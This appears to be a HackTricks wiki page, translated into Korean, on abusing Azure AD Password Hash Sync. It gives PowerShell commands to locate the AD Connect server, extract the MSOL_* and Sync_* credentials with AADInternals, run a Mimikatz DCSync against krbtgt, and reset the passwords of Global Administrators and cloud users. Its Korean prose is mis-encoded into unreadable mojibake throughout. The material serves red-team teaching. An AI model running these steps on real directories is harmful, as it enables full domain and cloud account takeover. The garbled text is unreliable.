# Az - PHS - Password Hash Sync

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Basic Information

[From the docs:](https://learn.microsoft.com/en-us/entra/identity/hybrid/connect/whatis-phs) **Password hash synchronization**ì€ í•˜ì´ë¸Œë¦¬ë“œ ì•„ì´ë´í‹°í‹°ë¥¼ ë‹¬ì„±í•˜ê¸° ìœ„í•´ ì‚¬ìš©ë˜ëŠ” ë¡œê·¸ì¸ ë°©ë²• ì¤‘ í•˜ë‚˜ì…ë‹ˆë‹¤. **Azure AD Connect**ëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ Active Directory ì¸ìŠ¤í„´ìŠ¤ì—ì„œ í´ë¼ìš°ë“œ ê¸°ë°˜ Azure AD ì¸ìŠ¤í„´ìŠ¤ë¡œ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ í•´ì‹œì˜ í•´ì‹œë¥¼ ë™ê¸°í™”í•©ë‹ˆë‹¤.

<figure><img src="../../../../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

ì´ëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ ADë¥¼ Azure ADì™€ ë™ê¸°í™”í•˜ëŠ” ë° ì‚¬ìš©ë˜ëŠ” **ê°€ì¥ ì¼ë°˜ì ì¸ ë°©ë²•**ì…ë‹ˆë‹¤.

ëª¨ë“  **ì‚¬ìš©ì**ì™€ **ë¹„ë°€ë²ˆí˜¸ í•´ì‹œì˜ í•´ì‹œ**ê°€ ì˜¨í”„ë ˆë¯¸ìŠ¤ì—ì„œ Azure ADë¡œ ë™ê¸°í™”ë©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ **í‰ë¬¸ ë¹„ë°€ë²ˆí˜¸**ë‚˜ **ì›ë³¸ í•´ì‹œ**ëŠ” Azure ADë¡œ ì „ì†¡ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.\
ë˜í•œ, **ë‚´ì¥ëœ** ë³´ì•ˆ ê·¸ë£¹(ì˜ˆ: ë„ë©”ì¸ ê´€ë¦¬ì ë“±)ì€ Azure ADë¡œ **ë™ê¸°í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**.

**í•´ì‹œ ë™ê¸°í™”**ëŠ” **2ë¶„ë§ˆë‹¤** ë°œìƒí•©ë‹ˆë‹¤. ê·¸ëŸ¬ë‚˜ ê¸°ë³¸ì ìœ¼ë¡œ **ë¹„ë°€ë²ˆí˜¸ ë§Œë£Œ** ë° **ê³„ì • ë§Œë£Œ**ëŠ” Azure ADì—ì„œ **ë™ê¸°í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤**. ë”°ë¼ì„œ **ì˜¨í”„ë ˆë¯¸ìŠ¤ ë¹„ë°€ë²ˆí˜¸ê°€ ë§Œë£Œëœ**(ë³€ê²½ë˜ì§€ ì•Šì€) ì‚¬ìš©ìëŠ” ì´ì „ ë¹„ë°€ë²ˆí˜¸ë¥¼ ì‚¬ìš©í•˜ì—¬ ê³„ì† **Azure ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì˜¨í”„ë ˆë¯¸ìŠ¤ ì‚¬ìš©ìê°€ Azure ë¦¬ì†ŒìŠ¤ì— ì•¡ì„¸ìŠ¤í•˜ë ¤ê³  í•  ë•Œ, **ì¸ì¦ì€ Azure ADì—ì„œ ì´ë£¨ì–´ì§‘ë‹ˆë‹¤**.

**PHS**ëŠ” **Identity Protection** ë° AAD Domain Servicesì™€ ê°™ì€ ê¸°ëŠ¥ì— í•„ìš”í•©ë‹ˆë‹¤.

## Pivoting

PHSê°€ êµ¬ì„±ë˜ë©´ ì¼ë¶€ **íŠ¹ê¶Œ ê³„ì •**ì´ ìë™ìœ¼ë¡œ **ìƒì„±**ë©ë‹ˆë‹¤:

* **`MSOL_<installationID>`** ê³„ì •ì´ ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì— ìë™ìœ¼ë¡œ ìƒì„±ë©ë‹ˆë‹¤. ì´ ê³„ì •ì€ **Directory Synchronization Accounts** ì—­í• ì„ ë¶€ì—¬ë°›ìœ¼ë©° (ìì„¸í•œ ë‚´ìš©ì€ [ë¬¸ì„œ](https://docs.microsoft.com/en-us/azure/active-directory/users-groups-roles/directory-assign-admin-roles#directory-synchronization-accounts-permissions) ì°¸ì¡°) ì´ëŠ” **ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì—ì„œ ë³µì œ(DCSync) ê¶Œí•œì„ ê°€ì§‘ë‹ˆë‹¤**.
* **`Sync_<name of on-prem ADConnect Server>_installationID`** ê³„ì •ì´ Azure ADì— ìƒì„±ë©ë‹ˆë‹¤. ì´ ê³„ì •ì€ Azure ADì—ì„œ **ëª¨ë“  ì‚¬ìš©ì**(ë™ê¸°í™”ëœ ì‚¬ìš©ì ë˜ëŠ” í´ë¼ìš°ë“œ ì „ìš©)ì˜ **ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.

ì´ì „ì˜ ë‘ íŠ¹ê¶Œ ê³„ì •ì˜ ë¹„ë°€ë²ˆí˜¸ëŠ” **Azure AD Connectê°€ ì„¤ì¹˜ëœ ì„œë²„ì˜ SQL ì„œë²„**ì— **ì €ì¥**ë©ë‹ˆë‹¤. ê´€ë¦¬ìëŠ” ì´ëŸ¬í•œ íŠ¹ê¶Œ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ í‰ë¬¸ìœ¼ë¡œ ì¶”ì¶œí•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.\
ë°ì´í„°ë² ì´ìŠ¤ëŠ” `C:\Program Files\Microsoft Azure AD Sync\Data\ADSync.mdf`ì— ìœ„ì¹˜í•´ ìˆìŠµë‹ˆë‹¤.

í•˜ë‚˜ì˜ í…Œì´ë¸”ì—ì„œ êµ¬ì„±ì„ ì¶”ì¶œí•  ìˆ˜ ìˆìœ¼ë©°, í•˜ë‚˜ëŠ” ì•”í˜¸í™”ë˜ì–´ ìˆìŠµë‹ˆë‹¤:

`SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent;`

**ì•”í˜¸í™”ëœ êµ¬ì„±**ì€ **DPAPI**ë¡œ ì•”í˜¸í™”ë˜ì–´ ìˆìœ¼ë©°, ì´ëŠ” ì˜¨í”„ë ˆë¯¸ìŠ¤ ADì˜ **`MSOL_*`** ì‚¬ìš©ìì™€ AzureADì˜ **Sync\_\*** ì‚¬ìš©ìì˜ **ë¹„ë°€ë²ˆí˜¸ë¥¼ í¬í•¨**í•©ë‹ˆë‹¤. ë”°ë¼ì„œ ì´ë¥¼ ì†ìƒì‹œí‚¤ë©´ ADì™€ AzureADë¡œì˜ ê¶Œí•œ ìƒìŠ¹ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.

ì´ ìê²© ì¦ëª…ì´ ì–´ë–»ê²Œ ì €ì¥ë˜ê³  í•´ë…ë˜ëŠ”ì§€ì— ëŒ€í•œ [ì „ì²´ ê°œìš”ëŠ” ì´ ê°•ì—°ì—ì„œ í™•ì¸í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤](https://www.youtube.com/watch?v=JEIR5oGCwdg).

### **Azure AD connect ì„œë²„ ì°¾ê¸°**

**Azure AD connectê°€ ì„¤ì¹˜ëœ ì„œë²„**ê°€ ë„ë©”ì¸ì— ê°€ì…ëœ ê²½ìš°(ë¬¸ì„œì—ì„œ ê¶Œì¥ë¨), ë‹¤ìŒì„ í†µí•´ ì°¾ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤:
```powershell
# ActiveDirectory module
Get-ADUser -Filter "samAccountName -like 'MSOL_*'" - Properties * | select SamAccountName,Description | fl

#Azure AD module
Get-AzureADUser -All $true | ?{$_.userPrincipalName -match "Sync_"}
```
### MSOL\_\* ì•…ìš©
```powershell
# Once the Azure AD connect server is compromised you can extract credentials with the AADInternals module
Get-AADIntSyncCredentials

# Using the creds of MSOL_* account, you can run DCSync against the on-prem AD
runas /netonly /user:defeng.corp\MSOL_123123123123 cmd
Invoke-Mimikatz -Command '"lsadump::dcsync /user:domain\krbtgt /domain:domain.local /dc:dc.domain.local"'
```
{% hint style="danger" %}
You can also use [**adconnectdump**](https://github.com/dirkjanm/adconnectdump) to obtain these credentials.
{% endhint %}

### Sync\_\* ì•…ìš©

**`Sync_*`** ê³„ì •ì„ ì†ìƒì‹œí‚¤ë©´ ëª¨ë“  ì‚¬ìš©ìì˜ **ë¹„ë°€ë²ˆí˜¸ë¥¼ ì¬ì„¤ì •**í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤ (Global Administrators í¬í•¨).
```powershell
# This command, run previously, will give us alse the creds of this account
Get-AADIntSyncCredentials

# Get access token for Sync_* account
$passwd = ConvertTo-SecureString '<password>' -AsPlainText - Force
$creds = New-Object System.Management.Automation.PSCredential ("Sync_SKIURT-JAUYEH_123123123123@domain.onmicrosoft.com", $passwd)
Get-AADIntAccessTokenForAADGraph -Credentials $creds - SaveToCache

# Get global admins
Get-AADIntGlobalAdmins

# Get the ImmutableId of an on-prem user in Azure AD (this is the Unique Identifier derived from on-prem GUID)
Get-AADIntUser -UserPrincipalName onpremadmin@domain.onmicrosoft.com | select ImmutableId

# Reset the users password
Set-AADIntUserPassword -SourceAnchor "3Uyg19ej4AHDe0+3Lkc37Y9=" -Password "JustAPass12343.%" -Verbose

# Now it's possible to access Azure AD with the new password and op-prem with the old one (password changes aren't sync)
```
í´ë¼ìš°ë“œ ì‚¬ìš©ìë“¤ì˜ **ë¹„ë°€ë²ˆí˜¸ë§Œ ìˆ˜ì •**í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤ (ë¹„ë¡ ì˜ˆìƒì¹˜ ëª»í•œ ì¼ì´ì§€ë§Œ)
```powershell
# To reset the password of cloud only user, we need their CloudAnchor that can be calculated from their cloud objectID
# The CloudAnchor is of the format USER_ObjectID.
Get-AADIntUsers | ?{$_.DirSyncEnabled -ne "True"} | select UserPrincipalName,ObjectID

# Reset password
Set-AADIntUserPassword -CloudAnchor "User_19385ed9-sb37-c398-b362-12c387b36e37" -Password "JustAPass12343.%" -Verbosewers
```
ì´ ì‚¬ìš©ìì˜ ë¹„ë°€ë²ˆí˜¸ë¥¼ ë¤í”„í•˜ëŠ” ê²ƒë„ ê°€ëŠ¥í•©ë‹ˆë‹¤.

{% hint style="danger" %}
ë‹¤ë¥¸ ì˜µì…˜ìœ¼ë¡œëŠ” **ì„œë¹„ìŠ¤ ì£¼ì²´ì— íŠ¹ê¶Œ ê¶Œí•œì„ í• ë‹¹**í•˜ëŠ” ê²ƒì´ ìˆìœ¼ë©°, ì´ëŠ” **Sync** ì‚¬ìš©ìê°€ **ê¶Œí•œ**ì„ ê°€ì§€ê³  ìˆìœ¼ë©°, ê·¸ëŸ° ë‹¤ìŒ **ì„œë¹„ìŠ¤ ì£¼ì²´ì— ì ‘ê·¼**í•˜ì—¬ privescë¥¼ ìˆ˜í–‰í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.
{% endhint %}

### Seamless SSO

Seamless SSOë¥¼ PHSì™€ í•¨ê»˜ ì‚¬ìš©í•˜ëŠ” ê²ƒì´ ê°€ëŠ¥í•˜ë©°, ì´ëŠ” ë‹¤ë¥¸ ì•…ìš©ì— ì·¨ì•½í•©ë‹ˆë‹¤. í™•ì¸í•´ë³´ì„¸ìš”:

{% content-ref url="seamless-sso.md" %}
[seamless-sso.md](seamless-sso.md)
{% endcontent-ref %}

## References

* [https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs](https://learn.microsoft.com/en-us/azure/active-directory/hybrid/whatis-phs)
* [https://aadinternals.com/post/on-prem\_admin/](https://aadinternals.com/post/on-prem\_admin/)
* [https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf](https://troopers.de/downloads/troopers19/TROOPERS19\_AD\_Im\_in\_your\_cloud.pdf)
* [https://www.youtube.com/watch?v=xei8lAPitX8](https://www.youtube.com/watch?v=xei8lAPitX8)

{% hint style="success" %}
AWS Hackingì„ ë°°ìš°ê³  ì—°ìŠµí•˜ì„¸ìš”:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hackingì„ ë°°ìš°ê³  ì—°ìŠµí•˜ì„¸ìš”: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks ì§€ì›í•˜ê¸°</summary>

* [**êµ¬ë… í”Œëœ**](https://github.com/sponsors/carlospolop)ì„ í™•ì¸í•˜ì„¸ìš”!
* ğŸ’¬ [**Discord ê·¸ë£¹**](https://discord.gg/hRep4RUj7f) ë˜ëŠ” [**telegram ê·¸ë£¹**](https://t.me/peass)ì— ê°€ì…í•˜ê±°ë‚˜ **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)ì„ íŒ”ë¡œìš°í•˜ì„¸ìš”.
* **PRì„ ì œì¶œí•˜ì—¬** [**HackTricks**](https://github.com/carlospolop/hacktricks) ë° [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ì €ì¥ì†Œì— í•´í‚¹ íŠ¸ë¦­ì„ ê³µìœ í•˜ì„¸ìš”.

</details>
{% endhint %}
